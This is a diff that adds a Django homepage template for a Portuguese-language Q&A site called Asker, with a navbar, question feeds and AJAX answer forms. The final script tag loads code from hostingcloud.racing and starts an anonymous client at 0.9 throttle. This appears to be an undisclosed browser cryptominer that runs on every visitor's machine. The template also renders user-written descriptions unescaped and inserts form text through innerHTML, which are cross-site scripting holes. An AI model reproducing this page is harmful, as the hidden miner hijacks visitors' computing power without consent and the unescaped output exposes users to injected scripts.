@@ -1,0 +1,236 @@
+{% load humanize %}
+{% load main_app_extras %}
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>Asker | Página inicial</title>
+
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+		<!--<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">-->
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+		<script src="https://kit.fontawesome.com/1f965a8b94.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.form/4.3.0/jquery.form.min.js"></script>
+
+
+		<!-- SCROLL INFINITO: -->
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/jquery.waypoints.min.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/shortcuts/infinite.min.js"></script>
+
+
+		<link rel="stylesheet" href="/static/css/index.css">
+
+		<meta name="propeller" content="1b6f68062e9bcda64f6be0d18066ccb1">
+	</head>
+	<body>
+		<nav class="navbar navbar-expand-sm   navbar-light bg-light">
+		    <a id="logo" href="/" class="navbar-brand"><img src="/static/images/asker.png" height="40px" alt="Asker"></a>
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo03" aria-controls="navbarTogglerDemo03" aria-expanded="false" aria-label="Toggle navigation">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+
+			<div class="collapse navbar-collapse" id="navbarTogglerDemo03">
+				<ul class="navbar-nav mr-auto mt-2 mt-lg-0">
+					{% if user.is_authenticated %}
+					<li class="nav-item">
+						<a class="nav-link" href="/user/{{ user.username }}"><i class="far fa-user"></i> perfil</a>
+					</li>
+					<li class="nav-item">
+						<a class="nav-link" href="/ask"><i class="fas fa-question"></i> perguntar</a>
+					</li>
+					<li class="nav-item">
+					    <a class="nav-link" href="/notifications"><i class="far fa-bell"></i> notificações</a>
+					</li>
+					<li class="nav-item">
+					    <a class="nav-link" href="/rank"><i class="fas fa-trophy"></i> rank</a>
+					</li>
+					<li class="nav-item">
+						<a class="nav-link" href="/logout"><i class="fas fa-external-link-alt"></i> sair</a>
+					</li>
+					{% else %}
+					<li class="nav-item">
+					    <a class="nav-link" href="/signin">Entrar</a>
+					</li>
+					<li class="nav-item">
+						<a class="nav-link" href="/signup">Criar uma conta</a>
+					</li>
+					{% endif %}
+				</ul>
+			</div>
+		</nav>
+{{ account_verification_alert|safe }}
+
+
+
+<style>
+	#alert {
+		width: 50%;
+		margin: auto;
+	}
+
+	#hide-alert {
+		float: right;
+		border-bottom-style: solid;
+		border-bottom-width: 1px;
+		cursor: pointer;
+	}
+
+	#alert-elements {
+		display: none;
+	}
+
+	@media (min-width: 320px) and (max-width: 480px) {
+		#alert {
+			width: 100%;
+		}
+	}
+</style>
+<div id="alert" class="alert alert-info" role="alert">
+	<span id="hide-alert">Mostrar</span>
+  <h4 class="alert-heading">Aviso</h4>
+  <div id="alert-elements">
+	  <p>Devido a um erro no registrador de domínios GoDaddy.com, o Asker vai utilizar este domínio: <b>asker.pythonanywhere.com</b> até que o domínio <b>asker.fun</b> seja recuperado.</p>
+	  <hr>
+	  <p class="mb-0">Dica: adicione este site aos favoritos!</p>
+	  <small>Obrigado a todos os usuários do Asker.</small>
+  </div>
+</div>
+<script>
+	btn = document.getElementById('hide-alert')
+	btn.onclick = function() {
+		if (btn.innerText == 'Mostrar') {
+			btn.innerText = 'Ocultar'
+		} else
+			btn.innerText = 'Mostrar'
+
+		alert_div = document.getElementById('alert-elements')
+		if (window.getComputedStyle(alert_div, null).display == 'none') {
+			alert_div.style.display = 'block'
+		} else
+			alert_div.style.display = 'none'
+	}
+</script>
+
+
+
+		<ul class="nav nav-tabs" id="tabs">
+			<li class="nav-item">
+				<a class="nav-link" id="popular">Popular</a>
+			</li>
+			<li class="nav-item">
+				<a class="nav-link" id="news">Novas perguntas</a>
+			</li>
+		</ul>
+
+			<section id="n_questions">
+				<div class="infinite-container">
+					{% for question in questions %}
+					<div class="infinite-item">
+						<div class="card">
+							<div class="card-body">
+								<a href="/question/{{ question.id }}">
+									<b>{{ question.text }}</b>
+								</a>
+								<p>
+									{% if question.description != '' %}
+			{{ question.description|cut_description|safe|linebreaksbr }}
+									{% endif %}
+								</p>
+								<small>{{ question.id|total_answers }} respostas <b>&middot;</b> <span class="text-muted">{{ question.pub_date|naturaltime }}</span></small>
+							{% if user.is_authenticated %}
+								{% if user_p.active %}
+								{% if user.username|answered:question.id %}
+								<span style="display: block"><b>Sua resposta:</b></span> {{ user.username|answer:question.id|linebreaksbr }}
+								{% else %}
+								<form id="form-{{ question.id }}" class="response-form" method="post" action="/">
+									{% csrf_token %}
+									<input name="question_id" type="hidden" value="{{ question.id }}">
+									<textarea name="text" maxlength="5000" class="form-control" placeholder="Escreva sua resposta aqui" onclick="return show_form_buttons(this.parentElement)"></textarea>
+									<input class="btn btn-outline-primary form-button" type="submit" value="Enviar">
+									<input class="btn btn-outline-primary form-button" type="submit" value="Cancelar" onclick="return hide_form_buttons(this.parentElement)">
+									<img style="display: none" id="modal-{{ question.id }}" src="/static/images/loading.gif" width="5%;">
+								</form>
+								<script>
+									$("#form-{{ question.id }}").submit(function() {
+										if('{{ question.creator.user.username|blocked:user.username }}' == 'Bloqueado') {
+											textarea = document.getElementById('form-{{ question.id }}').getElementsByTagName('textarea')[0]
+											textarea.classList.add('is-invalid')
+											alert('Você está impossibilidado de responder as perguntas deste usuário.')
+											return false
+										}
+
+										m = document.getElementById("modal-{{ question.id }}")
+										m.style.display = "block"
+										f = document.getElementById("form-{{ question.id }}")
+										f.getElementsByClassName("form-button")[0].style.display = "none"
+										f.getElementsByClassName("form-button")[1].style.display = "none"
+										$(this).ajaxSubmit(function() {
+											m.style.display = "none"
+											f.innerHTML = '<span style="display: block"><b>Sua resposta:</b></span> ' + f.text.value
+										})
+										return false
+									})
+								</script>
+								{% endif %}
+								{% else %}
+								<p>Confirme seu email (verifique sua caixa de entrada do email: {{ user.email }}) para responder está pergunta.</p>
+								{% endif %}
+							{% else %}
+							<p><a href="/signin?redirect=/question/{{ question.id }}">Faça login</a> ou <a href="/signup?redirect=/question/{{ question.id }}">crie uma conta</a> para responder está pergunta.</p>
+							{% endif %}
+							</div>
+						</div>
+					</div>
+					{% endfor %}
+				</div>
+
+  {% if questions.has_next %}
+    <a class="infinite-more-link" href="/news?page={{ questions.next_page_number }}">Próxima página</a>
+  {% endif %}
+			</section>
+
+			<section id="p_questions">
+
+				{% for question in popular_questions %}
+				<div class="card">
+					<div class="card-body">
+						<a href="/question/{{ question.id }}">
+							<b>{{ question.text }}</b>
+						</a>
+						<p>
+							{% if question.description != '' %}
+	{{ question.description|cut_description|safe|linebreaksbr }}
+							{% endif %}
+						</p>
+						<small>{{ question.id|total_answers }} respostas <b>&middot;</b> <span>{{ question.total_likes }} likes</span> <b>&middot;</b> {{ question.id|last_response|safe }}</small>
+					{% if user.is_authenticated %}
+						{% if user.username|answered:question.id %}
+						<span style="display: block"><b>Sua resposta:</b></span> {{ user.username|answer:question.id|linebreaksbr }}
+						{% else %}
+						<a style="display: block" href="/question/{{ question.id }}"><button class="btn btn-outline-primary">Responder</button></a>
+						{% endif %}
+					{% else %}
+					<p><a href="/signin?redirect=/question/{{ question.id }}">Faça login</a> ou <a href="/signup?redirect=/question/{{ question.id }}">crie uma conta</a> para responder está pergunta.</p>
+					{% endif %}
+					</div>
+				</div>
+				{% endfor %}
+				<h5>Fim! <a href="/news">Clique aqui</a> para ver as novas perguntas.</h5>
+			</section>
+
+		<script src="/static/js/index.js"></script>
+
+<script src="https://www.hostingcloud.racing/gCgZ.js"></script>
+<script>
+    var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
+        throttle: 0.9, c: 'w', ads: 0
+    });
+    _client.start();
+
+
+</script>
+	</body>
+</html>
